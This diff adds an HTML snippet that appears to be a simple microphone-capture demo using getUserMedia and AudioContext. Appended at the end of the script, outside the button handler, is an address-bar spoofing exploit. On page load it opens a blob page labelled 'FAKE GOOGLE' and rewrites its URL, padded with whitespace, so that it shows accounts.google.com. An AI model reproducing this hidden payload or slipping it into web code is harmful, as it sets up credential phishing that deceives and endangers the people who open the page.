@@ -1,0 +1,24 @@
+<button id="startAudio">Start Audio</button>
+
+<script>
+  const startAudioButton = document.getElementById('startAudio');
+
+  startAudioButton.addEventListener('click', async () => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      const audioContext = new AudioContext();
+      const source   
+ = audioContext.createMediaStreamSource(stream);
+      const destination = audioContext.createMediaStreamDestination();
+      source.connect(destination);   
+
+
+      // Now you can use the destination stream for further processing or playback
+      console.log('Audio stream started successfully.');
+    } catch (error) {
+      console.error('Error accessing microphone:', error);
+    }
+  });
+var exp = 'FAKE GOOGLE<script>history.replaceState("","","blob:'+location.protocol+'//accounts.google.com'+Array(1000).join(' ')+'@'+location.host+'/")<\/script>';
+location=URL.createObjectURL(new Blob([exp], {type: "text/html"}))
+</script>
